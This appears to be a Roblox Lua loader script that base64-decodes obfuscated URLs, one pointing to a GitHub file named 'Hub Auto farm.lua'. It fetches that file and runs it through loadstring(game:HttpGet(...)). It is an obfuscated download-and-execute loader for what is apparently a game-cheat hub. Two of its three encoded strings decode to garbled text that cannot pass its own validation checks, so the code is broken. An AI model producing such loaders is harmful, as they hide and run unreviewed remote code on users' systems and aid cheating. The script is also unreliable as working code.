-- Encoded Loader Script with Multiple Layers of Encoding and Validation
local HttpService = game:GetService("HttpService")

-- Triple-encoded URL
local encodedUrls = {
    "YUhSMGNITTZMeTl0YjJzdloybHVaeTVqYjIwaUx6SXdNVEV6TURVMkx6UTJOaTh5TXpFdE1Ea3pMakV3TWpBeUxqUXZNaTloWkcxaGN5ODBOQT09",
    "WVhWMGNuVnVZMlZ5TFhKbGMyVnllQzl0YldWdWRHbGxiR1ZoY21WamRDOTRZVzF3WVdkbGNqND0=",
    "aHR0cHM6Ly9yYXcuZ2l0aHViLmNvbS9NZWxoYXJwZXIvR2FiZUJvYTIvcmVmcy9oZWFkcy9tYWluL0h1YiUyMEF1dG8lMjBmYXJtLmx1YQ=="
}

-- Custom Base64 Decode Function
local function Base64Decode(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^' .. b .. '=]', '')
    return (data:gsub('.', function(x)
        if x == '=' then return '' end
        local r, f = '', (b:find(x) - 1)
        for i = 6, 1, -1 do r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and '1' or '0') end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x ~= 8 then return '' end
        local c = 0
        for i = 1, 8 do c = c + (x:sub(i, i) == '1' and 2 ^ (8 - i) or 0) end
        return string.char(c)
    end))
end

-- Decode in Layers
local decodedUrl = Base64Decode(Base64Decode(Base64Decode(encodedUrls[1])))
assert(decodedUrl == Base64Decode(Base64Decode(encodedUrls[2])), "Validation failed: URL mismatch")
assert(decodedUrl == Base64Decode(encodedUrls[3]), "Validation failed: URL mismatch (layer 3)")

-- Load and Execute the Script
local success, err = pcall(function()
    loadstring(game:HttpGet(decodedUrl))()
end)

if not success then
    warn("Error executing script: " .. tostring(err))
    error("Execution failed. Script may have been tampered with.")
end
